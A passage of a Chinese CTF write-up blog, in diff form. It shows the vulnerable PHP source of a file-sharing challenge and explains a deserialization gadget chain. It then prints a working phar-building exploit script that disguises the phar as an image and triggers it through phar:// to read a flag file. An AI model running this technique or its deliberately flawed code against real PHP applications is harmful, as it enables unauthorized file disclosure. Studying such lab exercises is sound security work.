class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">delete.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.php</span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">            <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">name</span>()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;涓嬭浇&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) &amp;&amp; !<span class="title function_ invoke__">is_dir</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">basename</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">round</span>(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2.最主要看的是class.php文件，class.php有三个类，分别是User，FileList，File，看到File中有close()中有一个file_get_contents()函数，可以打开文件，寻找可以使用close函数的地方，看到User类中有</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230320203700097.png" alt="image-20230320203700097"></p>
+<p>这样就有一个逻辑：User&#x3D;&gt;__destruct()&#x3D;&gt;File&#x3D;&gt;close()，试了试发现这个逻辑并不能</p>
+<p>3.在FileList类中有一个__call魔术方法</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230320204901597.png" alt="image-20230320204901597"></p>
+<p>这里的__call魔术方法，如果要调用的方法我们这个类中不存在，就会去File中找这个方法，并把执行结果存入 <code>$this-&gt;results[$file-&gt;name()][$func]</code>里面</p>
+<p>4.最终的链子是<code>$user -&gt; __destruct() =&gt; $db -&gt; close() =&gt; $db-&gt;__call(close) =&gt; $file -&gt; close() =&gt;$results=file_get_contents($filename) =&gt; FileList-&gt;__destruct()输出$result</code></p>
+<p>__destruct可以把<code>$this-&gt;results[$file-&gt;name()][$func]</code>的内容打印出来</p>
+<p>让$db等于new FileList()，File中的filename等于&#x2F;flag.txt</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;db=<span class="keyword">new</span> <span class="title class_">FileList</span>(); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;files=<span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">File</span>());  </span><br><span class="line">		<span class="variable language_">$this</span>-&gt;results=<span class="keyword">array</span>();</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;funcs=<span class="keyword">array</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//生成一个phar文件，文件名为shell.phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt; <span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&lt;?php __HALT_COMPILER();?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$user</span>); <span class="comment">//将对象user写入到metadata中</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;shell.txt&quot;</span>,<span class="string">&quot;snowy&quot;</span>); <span class="comment">//添加压缩文件，文件名字为shell.txt,内容为snowy</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p>运行这个脚本会自动生成shell.phar文件，将shell.phar文件后缀改为jpg，然后上传，抓取点击删除时的包</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230320210523503.png" alt="image-20230320210523503"></p>
+<p>在filename这使用phar:&#x2F;&#x2F;来读取该文件</p>
+<p><img src="/exp/question%20twenty-seven.htm/image-20230320210741776.png" alt="image-20230320210741776"></p>
+<p>在回显这里看到flag</p>
+<h3 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h3><p>1.打开直接显示源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span 